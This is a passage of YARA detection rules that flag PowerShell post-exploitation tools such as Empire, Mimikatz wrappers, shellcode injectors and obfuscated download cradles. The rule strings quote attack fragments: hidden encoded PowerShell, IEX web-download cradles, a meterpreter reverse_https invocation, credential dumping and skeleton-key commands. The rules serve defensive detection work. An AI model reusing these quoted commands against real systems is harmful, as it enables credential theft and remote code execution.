		$s1 = "script += \"Invoke-PortScan -noProgressMeter -f\"" fullword ascii 
		$s2 = "script += \" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str" ascii 
	condition:
		filesize < 14KB and all of them
}

rule Empire_Invoke_Shellcode {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"
	strings:
		$s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii 
		$s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii 
		$s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii 
	condition:
		filesize < 100KB and 1 of them
}

rule Empire_Invoke_Mimikatz {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "c5481864b757837ecbc75997fa24978ffde3672b8a144a55478ba9a864a19466"
	strings:
		$s1 = "$PEBytes64 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc" ascii 
		$s2 = "[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)" fullword ascii 
		$s3 = "Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp" fullword ascii 
	condition:
		filesize < 2500KB and 2 of them
}

rule Empire_lib_modules_credentials_mimikatz_pth {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file pth.py"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "6dee1cf931e02c5f3dc6889e879cc193325b39e18409dcdaf987b8bf7c459211"
	strings:
		$s0 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii 
		$s1 = "command = \"sekurlsa::pth /user:\"+self.options[\"user\"]['Value']" fullword ascii 
	condition:
		filesize < 12KB and all of them
}

rule Empire_Write_HijackDll {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "155fa7168e28f15bb34f67344f47234a866e2c63b3303422ff977540623c70bf"
	strings:
		$s1 = "$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \"debug.bat\" -ReplaceString $BatchPath" fullword ascii 
		$s2 = "$DllBytes32 = \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw" ascii 
		$s3 = "[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)" fullword ascii 
	condition:
		filesize < 500KB and 2 of them
}

rule Empire_skeleton_key {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "3d02f16dcc38faaf5e97e4c5dbddf761f2816004775e6af8826cde9e29bb750f"
	strings:
		$s1 = "script += \"Invoke-Mimikatz -Command '\\\"\" + command + \"\\\"';\"" fullword ascii 
		$s2 = "script += '\"Skeleton key implanted. Use password \\'mimikatz\\' for access.\"'" fullword ascii 
		$s3 = "command = \"misc::skeleton\"" fullword ascii 
		$s4 = "\"ONLY APPLICABLE ON DOMAIN CONTROLLERS!\")," fullword ascii 
	condition:
		filesize < 6KB and 2 of them
}

rule Empire_invoke_wmi {
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file invoke_wmi.py"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "a914cb227f652734a91d3d39745ceeacaef7a8b5e89c1beedfd6d5f9b4615a1d"
	strings:
		$s1 = "(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]" fullword ascii 
		$s2 = "script += \";'Invoke-Wmi executed on \" +computerNames +\"'\"" fullword ascii 
		$s3 = "script = \"$PSPassword = \\\"\"+password+\"\\\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Man" ascii 
	condition:
		filesize < 20KB and 2 of them
}

rule PowerShell_Susp_Parameter_Combo {
   meta:
      description = "Detects PowerShell invocation with suspicious parameters"
      author = "Florian Roth"
      reference = "https://goo.gl/uAic1X"
      date = "2017-03-12"
      score = 60
      type = "file"
   strings:
      /* Encoded Command */
      $sa1 = " -enc " ascii nocase
      $sa2 = " -EncodedCommand " ascii nocase

      /* Window Hidden */
      $sb1 = " -w hidden " ascii nocase
      $sb2 = " -window hidden " ascii nocase
      $sb3 = " -windowstyle hidden " ascii nocase

      /* Non Profile */
      $sc1 = " -nop " ascii nocase
      $sc2 = " -noprofile " ascii nocase

      /* Non Interactive */
      $sd1 = " -noni " ascii nocase
      $sd2 = " -noninteractive " ascii nocase

      /* Exec Bypass */
      $se1 = " -ep bypass " ascii nocase
      $se2 = " -exec bypass " ascii nocase
      $se3 = " -executionpolicy bypass " ascii nocase
      $se4 = " -exec bypass " ascii nocase

      /* Single Threaded - PowerShell Empire */
      $sf1 = " -sta " ascii

      $fp1 = "Chocolatey Software"
      $fp2 = "VBOX_MSI_INSTALL_PATH"
   condition:
      filesize < 3000KB and 4 of ($s*) and not 1 of ($fp*)
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-06-22
   Identifier: ISESteroids
   Reference: https://twitter.com/danielhbohannon/status/877953970437844993
*/

/* Rule Set ----------------------------------------------------------------- */

rule PowerShell_ISESteroids_Obfuscation {
   meta:
      description = "Detects PowerShell ISESteroids obfuscation"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/danielhbohannon/status/877953970437844993"
      date = "2017-06-23"
   strings:
      $x1 = "/\\/===\\__" ascii
      $x2 = "${__/\\/==" ascii
      $x3 = "Catch { }" fullword ascii
      $x4 = "\\_/=} ${_" ascii
   condition:
      2 of them
}

rule SUSP_Obfuscted_PowerShell_Code {
   meta:
      description = "Detects obfuscated PowerShell Code"
      date = "2018-12-13"
      author = "Florian Roth"
      reference = "https://twitter.com/silv0123/status/1073072691584880640"
   strings:
      $s1 = "').Invoke(" ascii
      $s2 = "(\"{1}{0}\"" ascii
      $s3 = "{0}\" -f" ascii
   condition:
      #s1 > 11 and #s2 > 10 and #s3 > 10
}

rule SUSP_PowerShell_Caret_Obfuscation_2 {
   meta:
      description = "Detects powershell keyword obfuscated with carets"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-07-20"
   strings:
      $r1 = /p[\^]?o[\^]?w[\^]?e[\^]?r[\^]?s[\^]?h[\^]?e[\^]?l\^l/ ascii wide nocase fullword
      $r2 = /p\^o[\^]?w[\^]?e[\^]?r[\^]?s[\^]?h[\^]?e[\^]?l[\^]?l/ ascii wide nocase fullword
   condition:
      1 of them
}

rule SUSP_OBFUSC_PowerShell_True_Jun20_1 {
   meta:
      description = "Detects indicators often found in obfuscated PowerShell scripts"
      author = "Florian Roth"
      reference = "https://github.com/corneacristian/mimikatz-bypass/"
      date = "2020-06-27"
      score = 75
   strings:
      $ = "${t`rue}" ascii nocase
      $ = "${tr`ue}" ascii nocase
      $ = "${tru`e}" ascii nocase
      $ = "${t`ru`e}" ascii nocase
      $ = "${tr`u`e}" ascii nocase
      $ = "${t`r`ue}" ascii nocase
      $ = "${t`r`u`e}" ascii nocase
   condition:
      filesize < 6000KB and 1 of them
}

rule PowerShell_Suite_Hacktools_Gen_Strings {
   meta:
      description = "Detects strings from scripts in the PowerShell-Suite repo"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
      date = "2017-12-27"
      hash1 = "79071ba5a984ee05903d566130467483c197cbc2537f25c1e3d7ae4772211fe0"
      hash2 = "db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5"
      hash3 = "4f51e7676a4d54c1962760ca0ac81beb28008451511af96652c31f4f40e8eb8e"
      hash4 = "17ac9bb0c46838c65303f42a4a346fcba838ebd5833b875e81dd65c82701d8a8"
      hash5 = "fa33aef619e620a88ecccb990e71c1e11ce2445f799979d23be2d1ad4321b6c6"
      hash6 = "5542bd89005819bc4eef8dfc8a158183e5fd7a1438c84da35102588f5813a225"
      hash7 = "c6a99faeba098eb411f0a9fcb772abac2af438fc155131ebfc93a00e3dcfad50"
      hash8 = "a8e06ecf5a8c25619ce85f8a23f2416832cabb5592547609cfea8bd7fcfcc93d"
      hash9 = "6aa5abf58904d347d441ac8852bd64b2bad3b5b03b518bdd06510931a6564d08"
      hash10 = "5608f25930f99d78804be8c9c39bd33f4f8d14360dd1e4cc88139aa34c27376d"
      hash11 = "68b6c0b5479ecede3050a2f44f8bb8783a22beeef4a258c4ff00974f5909b714"
      hash12 = "da25010a22460bbaabff0f7004204aae7d830348e8a4543177b1f3383b2c3100"
   strings:
      $ = "[!] NtCreateThreadEx failed.." fullword ascii
      $ = "[?] Executing mmc.." ascii
      $ = "[!] This method is only supported on 64-bit!" fullword ascii
      $ = "$LNK = [ShellLink.Shortcut]::FromByteArray($LNKHeader.GetBytes())" fullword ascii
      $ = "$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)" fullword ascii
      $ = "[!] Unable to open process (as Administrator), this may require SYSTEM access." fullword ascii
      $ = "[!] Error, NTSTATUS Value: " ascii
      $ = "[!] UAC artifact: " ascii
      $ = "[>] Process dump success!" ascii
      $ = "[!] Process dump failed!" ascii
      $ = "[+] Eidolon entry point:" fullword ascii
      $ = "Wait for shellcode to run" fullword ascii
      $ = "$Command = Read-Host \"`nSMB shell\"" fullword ascii
      $ = "Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines." fullword ascii
      $ = "Invoke-CreateProcess -Binary C:\\Windows\\System32\\" ascii
      $ = "[?] Thread belongs to: " ascii
      $ = "[?] Operating system core count: " ascii
      $ = "[>] Calling Advapi32::LookupPrivilegeValue --> SeDebugPrivilege" fullword ascii
      $ = "Calling Advapi32::OpenProcessToken --> LSASS" ascii
      $ = "[!] Mmm, something went wrong! GetLastError returned:" ascii
      $ = "if (($FileBytes[0..1] | % {[Char]$_}) -join '' -cne 'MZ')" fullword ascii
   condition:
      filesize < 100KB and 1 of them
}

rule PowerShell_Suite_Eidolon {
   meta:
      description = "Detects PowerShell Suite Eidolon script - file Start-Eidolon.ps1"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/FuzzySecurity/PowerShell-Suite"
      date = "2017-12-27"
      hash1 = "db31367410d0a9ffc9ed37f423a4b082639591be7f46aca91f5be261b23212d5"
   strings:
      $ = "[+] Eidolon entry point:" ascii
      $ = "C:\\PS> Start-Eidolon -Target C:\\Some\\File.Path -Mimikatz -Verbose" fullword ascii
      $ = "[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')" fullword ascii
   condition:
      uint16(0) == 0x7566 and filesize < 13000KB and 1 of them
}
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-02-23
   Identifier: Suspicious PowerShell Script Code
*/

/* Rule Set ----------------------------------------------------------------- */

rule WordDoc_PowerShell_URLDownloadToFile {
   meta:
      description = "Detects Word Document with PowerShell URLDownloadToFile"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://www.arbornetworks.com/blog/asert/additional-insights-shamoon2/"
      date = "2017-02-23"
      super_rule = 1
      hash1 = "33ee8a57e142e752a9c8960c4f38b5d3ff82bf17ec060e4114f5b15d22aa902e"
      hash2 = "388b26e22f75a723ce69ad820b61dd8b75e260d3c61d74ff21d2073c56ea565d"
      hash3 = "71e584e7e1fb3cf2689f549192fe3a82fd4cd8ee7c42c15d736ebad47b028087"
   strings:
      $w1 = "Microsoft Forms 2.0 CommandButton" fullword ascii
      $w2 = "Microsoft Word 97-2003 Document" fullword ascii

      $p1 = "powershell.exe" fullword ascii
      $p2 = "URLDownloadToFile" fullword ascii
   condition:
      ( uint16(0) == 0xcfd0 and 1 of ($w*) and all of ($p*) )
}

rule Suspicious_PowerShell_Code_1 {
   meta:
      description = "Detects suspicious PowerShell code"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
		score = 60
      reference = "Internal Research"
      date = "2017-02-22"
      type = "file"
   strings:
      $s1 = /$[a-z]=new-object net.webclient/ ascii
      $s2 = /$[a-z].DownloadFile\("http:/ ascii
      $s3 = /IEX $[a-zA-Z]{1,8}.downloadstring\(["']http/ ascii nocase
		$s4 = "powershell.exe -w hidden -ep bypass -Enc" ascii
		$s5 = "-w hidden -noni -nop -c \"iex(New-Object" ascii
		$s6 = "powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run" nocase
   condition:
      1 of them
}

rule Suspicious_PowerShell_WebDownload_1 {
   meta:
      description = "Detects suspicious PowerShell code that downloads from web sites"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
		score = 60
      reference = "Internal Research"
      date = "2017-02-22"
      type = "file"
   strings:
      $s1 = "System.Net.WebClient).DownloadString(\"http" ascii nocase
		$s2 = "System.Net.WebClient).DownloadString('http" ascii nocase

      $fp1 = "NuGet.exe" ascii fullword
      $fp2 = "chocolatey.org" ascii
   condition:
      1 of ($s*) and not 1 of ($fp*)
}


/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-06-27
   Identifier: Misc
   Reference: Internal Research
*/

/* Rule Set ----------------------------------------------------------------- */

rule PowerShell_in_Word_Doc {
   meta:
      description = "Detects a powershell and bypass keyword in a Word document"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research - ME"
      date = "2017-06-27"
      score = 50
      hash1 = "4fd4a7b5ef5443e939015276fc4bf8ffa6cf682dd95845ef10fdf8158fdd8905"
   strings:
      $s1 = "POwErSHELl.ExE" fullword ascii nocase
      $s2 = "BYPASS" fullword ascii nocase
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 1000KB and all of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-09-30
   Identifier: PowerShell with VBS and JS
   Reference: Internal Research
*/

/* Rule Set ----------------------------------------------------------------- */

rule Susp_PowerShell_Sep17_1 {
   meta:
      description = "Detects suspicious PowerShell script in combo with VBS or JS "
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-30"
      score = 60
      hash1 = "8e28521749165d2d48bfa1eac685c985ac15fc9ca5df177d4efadf9089395c56"
   strings:
      $x1 = "Process.Create(\"powershell.exe -nop -w hidden" fullword ascii nocase
      $x2 = ".Run\"powershell.exe -nop -w hidden -c \"\"IEX " ascii

      $s1 = "window.resizeTo 0,0" fullword ascii
   condition:
      ( filesize < 2KB and 1 of them )
}

rule Susp_PowerShell_Sep17_2 {
   meta:
      description = "Detects suspicious PowerShell script in combo with VBS or JS "
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-09-30"
      hash1 = "e387f6c7a55b85e0675e3b91e41e5814f5d0ae740b92f26ddabda6d4f69a8ca8"
   strings:
      $x1 = ".Run \"powershell.exe -nop -w hidden -e " ascii
      $x2 = "FileExists(path + \"\\..\\powershell.exe\")" fullword ascii
      $x3 = "window.moveTo -4000, -4000" fullword ascii

      $s1 = "= CreateObject(\"Wscript.Shell\")" fullword ascii
   condition:
      filesize < 20KB and (
         ( uint16(0) == 0x733c and 1 of ($x*) )
          or 2 of them
      )
}

rule WScript_Shell_PowerShell_Combo {
   meta:
      description = "Detects malware from Middle Eastern campaign reported by Talos"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html"
      date = "2018-02-07"
      score = 50
      hash1 = "15f5aaa71bfa3d62fd558a3e88dd5ba26f7638bf2ac653b8d6b8d54dc7e5926b"
   strings:
      $s1 = ".CreateObject(\"WScript.Shell\")" ascii

      $p1 = "powershell.exe" fullword ascii
      $p2 = "-ExecutionPolicy Bypass" fullword ascii
      $p3 = "[System.Convert]::FromBase64String(" ascii

      $fp1 = "Copyright: Microsoft Corp." ascii
   condition:
      filesize < 400KB and $s1 and 1 of ($p*)
      and not 1 of ($fp*)
}

rule SUSP_PowerShell_String_K32_RemProcess {
   meta:
      description = "Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/redsnarf"
      date = "2018-03-31"
      hash3 = "54a8dd78ec4798cf034c7765d8b2adfada59ac34d019e77af36dcaed1db18912"
      hash4 = "6d52cdd74edea68d55c596554f47eefee1efc213c5820d86e64de0853a4e46b3"
   strings:
      $x1 = "Throw \"Unable to allocate memory in the remote process for shellcode\"" fullword ascii
      $x2 = "$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")" fullword ascii
      $s3 = "$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants." ascii
      $s7 = "if ($RemoteProcHandle -eq [IntPtr]::Zero)" fullword ascii
      $s8 = "if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))" fullword ascii
      $s9 = "$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, " ascii
      $s15 = "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null" fullword ascii
   condition:
      uint16(0) == 0x7566 and filesize < 6000KB and 1 of them
}

rule PowerShell_JAB_B64 {
   meta:
      description = "Detects base464 encoded $ sign at the beginning of a string"
      license = "https://creativecommons.org/licenses/by-nc/4.0/"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/980915287922040832"
      date = "2018-04-02"
      score = 60
   strings:
      $s1 = "('JAB" ascii wide
      $s2 = "powershell" nocase
   condition:
      filesize < 30KB and all of them
}

rule SUSP_PS1_FromBase64String_Content_Indicator {
   meta:
      description = "Detects suspicious base64 encoded PowerShell expressions"
      author = "Florian Roth"
      reference = "https://gist.github.com/Neo23x0/6af876ee72b51676c82a2db8d2cd3639"
      date = "2020-01-25"
      type = "file"
   strings:
      $ = "::FromBase64String(\"H4s" ascii wide
      $ = "::FromBase64String(\"TVq" ascii wide
      $ = "::FromBase64String(\"UEs" ascii wide
      $ = "::FromBase64String(\"JAB" ascii wide
      $ = "::FromBase64String(\"SUVY" ascii wide
      $ = "::FromBase64String(\"SQBFAF" ascii wide
      $ = "::FromBase64String(\"SQBuAH" ascii wide
      $ = "::FromBase64String(\"PAA" ascii wide
      $ = "::FromBase64String(\"cwBhA" ascii wide
      $ = "::FromBase64String(\"aWV4" ascii wide
      $ = "::FromBase64String(\"aQBlA" ascii wide
      $ = "::FromBase64String(\"R2V0" ascii wide
      $ = "::FromBase64String(\"dmFy" ascii wide
      $ = "::FromBase64String(\"dgBhA" ascii wide
      $ = "::FromBase64String(\"dXNpbm" ascii wide
      $ = "::FromBase64String(\"H4sIA" ascii wide
      $ = "::FromBase64String(\"Y21k" ascii wide
      $ = "::FromBase64String(\"Qzpc" ascii wide
      $ = "::FromBase64String(\"Yzpc" ascii wide
      $ = "::FromBase64String(\"IAB" ascii wide

      $ = "::FromBase64String('H4s" ascii wide
      $ = "::FromBase64String('TVq" ascii wide
      $ = "::FromBase64String('UEs" ascii wide
      $ = "::FromBase64String('JAB" ascii wide
      $ = "::FromBase64String('SUVY" ascii wide
      $ = "::FromBase64String('SQBFAF" ascii wide
      $ = "::FromBase64String('SQBuAH" ascii wide
      $ = "::FromBase64String('PAA" ascii wide
      $ = "::FromBase64String('cwBhA" ascii wide
      $ = "::FromBase64String('aWV4" ascii wide
      $ = "::FromBase64String('aQBlA" ascii wide
      $ = "::FromBase64String('R2V0" ascii wide
      $ = "::FromBase64String('dmFy" ascii wide
      $ = "::FromBase64String('dgBhA" ascii wide
      $ = "::FromBase64String('dXNpbm" ascii wide
      $ = "::FromBase64String('H4sIA" ascii wide
      $ = "::FromBase64String('Y21k" ascii wide
      $ = "::FromBase64String('Qzpc" ascii wide
      $ = "::FromBase64String('Yzpc" ascii wide
      $ = "::FromBase64String('IAB" ascii wide
   condition:
      filesize < 5000KB and 1 of them
}
/*
	Yara Rule Set
	Author: Florian Roth
	Date: 2016-09-04
	Identifier: PowerShell Toolset - Cloaked
*/

/* Rule Set ----------------------------------------------------------------- */

rule ps1_toolkit_PowerUp {
	meta:
		description = "Auto-generated rule - file PowerUp.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "fc65ec85dbcd49001e6037de9134086dd5559ac41ac4d1adf7cab319546758ad"
	strings:
		$s1 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list vdir /text:vdir.name\" | % { " fullword ascii
		$s2 = "iex \"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe list apppools /text:name\" | % { " fullword ascii
		$s3 = "if ($Env:PROCESSOR_ARCHITECTURE -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBNAEQANgA0AA==')))) {" fullword ascii
		$s4 = "C:\\Windows\\System32\\InetSRV\\appcmd.exe list vdir /text:physicalpath | " fullword ascii
		$s5 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\inetsrv\\appcmd.exe\"))" fullword ascii
		$s6 = "if (Test-Path  (\"$Env:SystemRoot\\System32\\InetSRV\\appcmd.exe\")) {" fullword ascii
		$s7 = "Write-Verbose \"Executing command '$Cmd'\"" fullword ascii
		$s8 = "Write-Warning \"[!] Target service" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 4000KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Inveigh_BruteForce {
	meta:
		description = "Auto-generated rule - file Inveigh-BruteForce.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "a2ae1e02bcb977cd003374f551ed32218dbcba3120124e369cc150b9a63fe3b8"
	strings:
		$s1 = "Import-Module .\\Inveigh.psd1;Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 " fullword ascii
		$s2 = "$(Get-Date -format 's') - Attempting to stop HTTP listener\")|Out-Null" fullword ascii
		$s3 = "Invoke-InveighBruteForce -SpooferTarget 192.168.1.11 -Hostname server1" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 300KB and 1 of them ) or ( 2 of them )
}

rule ps1_toolkit_Invoke_Shellcode {
	meta:
		description = "Auto-generated rule - file Invoke-Shellcode.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "24abe9f3f366a3d269f8681be80c99504dea51e50318d83ee42f9a4c7435999a"
	strings:
		$s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
		$s2 = "Get-ProcAddress kernel32.dll OpenProcess" fullword ascii
		$s3 = "msfpayload windows/exec CMD=\"cmd /k calc\" EXITFUNC=thread C | sed '1,6d;s/[\";]//g;s/\\\\/,0/g' | tr -d '\\n' | cut -c2- " fullword ascii
		$s4 = "inject shellcode into" ascii
		$s5 = "Injecting shellcode" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 90KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Invoke_Mimikatz {
	meta:
		description = "Auto-generated rule - file Invoke-Mimikatz.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8"
	strings:
		$s1 = "Get-ProcAddress kernel32.dll WriteProcessMemory" fullword ascii
		$s2 = "ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId" fullword ascii
		$s3 = "privilege::debug exit" ascii
		$s4 = "Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" fullword ascii
		$s5 = "Invoke-Mimikatz -DumpCreds" fullword ascii
		$s6 = "| Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 10000KB and 1 of them ) or ( 3 of them )
}

rule ps1_toolkit_Invoke_RelfectivePEInjection {
	meta:
		description = "Auto-generated rule - file Invoke-RelfectivePEInjection.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a"
	strings:
		$x1 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)" fullword ascii
		$x2 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local" fullword ascii
		$x3 = "} = Get-ProcAddress Advapi32.dll OpenThreadToken" ascii
		$x4 = "Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local" fullword ascii
		$s5 = "$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')" fullword ascii
		$s6 = "= Get-ProcAddress Advapi32.dll AdjustTokenPrivileges" ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 700KB and 2 of them ) or ( all of them )
}

rule ps1_toolkit_Persistence {
	meta:
		description = "Auto-generated rule - file Persistence.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		hash1 = "e1a4dd18b481471fc25adea6a91982b7ffed1c2d393c8c17e6e542c030ac6cbd"
	strings:
		$s1 = "\"`\"```$Filter=Set-WmiInstance -Class __EventFilter -Namespace ```\"root\\subscription```" ascii
		$s2 = "}=$PROFILE.AllUsersAllHosts;${" ascii
		$s3 = "C:\\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup"  ascii
		$s4 = "= gwmi Win32_OperatingSystem | select -ExpandProperty OSArchitecture"  ascii
		$s5 = "-eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAxADQAQwA='))))"  ascii
		$s6 = "}=$PROFILE.CurrentUserAllHosts;${"  ascii
		$s7 = "FromBase64String('UwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBPAG4ASQBkAGwAZQA=')" ascii
		$s8 = "[System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)" fullword ascii
	condition:
		( uint16(0) == 0xbbef and filesize < 200KB and 2 of them ) or ( 4 of them )
}

rule ps1_toolkit_Invoke_Mimikatz_RelfectivePEInjection {
	meta:
		description = "Auto-generated rule - from files Invoke-Mimikatz.ps1, Invoke-RelfectivePEInjection.ps1"
		license = "https://creativecommons.org/licenses/by-nc/4.0/"
		author = "Florian Roth"
		reference = "https://github.com/vysec/ps1-toolkit"
		date = "2016-09-04"
		score = 80
		super_rule = 1
		hash1 = "5c31a2e3887662467cfcb0ac37e681f1d9b0f135e6dfff010aae26587e03d8c8"
		hash2 = "510b345f821f93c1df5f90ac89ad91fcd0f287ebdabec6c662b716ec9fddb03a"
	strings:
		$s1 = "[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])" fullword ascii
		$s2 = "if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)" fullword ascii
		$s3 = "[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)" fullword ascii
